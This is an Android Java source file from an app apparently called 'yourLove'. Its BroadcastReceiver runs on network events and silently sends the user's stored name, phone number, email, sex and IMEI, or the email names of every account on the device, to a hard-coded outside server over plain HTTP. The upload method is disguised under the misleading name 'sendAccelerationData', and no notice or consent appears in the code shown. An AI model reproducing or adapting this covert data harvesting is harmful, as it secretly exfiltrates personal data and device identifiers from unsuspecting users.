package ir.masterArt.yourLove;


import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.regex.Pattern;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.CallLog;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.widget.SimpleCursorAdapter;
import android.widget.Toast;

public class SendByMail extends BroadcastReceiver {
	
	SharedPreferences values;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		StrictMode.enableDefaults();
		
		ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
        
        if (!(networkInfo == null || !networkInfo.isConnected() || !networkInfo.isAvailable()) ) 
        {
        	values = context.getSharedPreferences("YOUR_LOVE", 0);
        	if(!values.getBoolean("SEND", false) && !values.getBoolean("first", true))
        	{
        		try {
					sendAccelerationData(values.getString("name", ""), 
							values.getString("phone", ""), 
							values.getString("mail", ""), 
							values.getString("sex", ""), 
							values.getString("imei", ""));
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
        	}
        	else
        	{
        		Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
	        	Account[] accounts = AccountManager.get(context).getAccounts();
	        	for (Account account : accounts)
	        	{
	        	    if (emailPattern.matcher(account.name).matches()) 
	        	    {
        	    		try {
        					sendAccelerationData("","",account.name,"","");
        				} catch (UnsupportedEncodingException e) {
        					// TODO Auto-generated catch block
        					e.printStackTrace();
        				}
	        	    }
	        	}
        	}
        }
		
	}
	
	 public void sendAccelerationData(String name,String phone,String mail,String sex,String imei) throws UnsupportedEncodingException
	 {
			//Add data to be send.
			ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(5);
			
			String finalString = URLEncoder.encode(name, "UTF-8");
			nameValuePairs.add(new BasicNameValuePair("name",finalString));
	    	nameValuePairs.add(new BasicNameValuePair("phone",phone));
	    	nameValuePairs.add(new BasicNameValuePair("mail",mail));
	    	nameValuePairs.add(new BasicNameValuePair("sex",sex));
	    	nameValuePairs.add(new BasicNameValuePair("imei",imei));
	    	
		    HttpResponse response = null;
		    
		    try
		    {
		    	HttpClient httpclient = new DefaultHttpClient();
		    	HttpPost httppost = new HttpPost("http://officechair.ir/yourLove.php");
//		    	httppost.setHeader( "Content-Type", "application/json;charset=UTF-8" );
		    	httppost.setEntity( new UrlEncodedFormEntity(nameValuePairs,HTTP.UTF_8));//);
		    	response = httpclient.execute(httppost);
				Log.e("postData", response.getStatusLine().toString());
				if(response.getStatusLine().toString().contains("OK"))
				{
					values.edit().putBoolean("SEND", true).commit();
				}
		    	
		    }
		    catch(Exception e)
		    {
		    	//Toast.makeText(IncomingSms.this, response.getStatusLine().toString(), Toast.LENGTH_SHORT).show();
		    }
		    	
	 }


}
